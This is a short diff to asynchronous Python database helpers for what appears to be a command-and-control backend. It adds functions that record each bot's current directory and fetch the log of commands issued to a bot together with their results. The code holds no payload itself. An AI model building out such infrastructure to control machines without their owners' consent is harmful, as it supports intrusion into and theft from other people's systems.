@@ -29,6 +29,21 @@ async def create_new_bot(token: str, username, hostname, ip, os, cpu, gpu, ram, 
             print(f"Exception: {str(e)}")
             return False
 
+async def update_location(token, cur_dir):
+    async with (await get_connection_pool()).acquire() as conn:
+        try:
+            bot = await get_bot(token)
+
+            await conn.execute("""
+            UPDATE bot_info
+            SET current_directory = $1 
+            WHERE bot_id = $2
+            """, cur_dir, bot["id"])
+            return True
+        except Exception as e:
+            print(f"Exception: {str(e)}")
+            return False
+
 async def get_bot(token: str):
     async with (await get_connection_pool()).acquire() as conn:
         try:
@@ -47,4 +62,17 @@ async def get_bot_info(bot_id):
             """, bot_id)
             return bot_info
         except Exception as e:
+            return None
+
+async def get_logs(bot_id):
+    async with (await get_connection_pool()).acquire() as conn:
+        try:
+            logs = await conn.fetch("""
+            SELECT commands.command, commands.directory, commands.status, logs.result FROM commands LEFT JOIN logs ON logs.command_id = commands.id 
+            WHERE commands.bot_id = $1
+            ORDER BY commands.issued_at ASC
+            """, bot_id)
+            return logs
+        except Exception as e:
+            print(f"exception: {str(e)}")
             return None
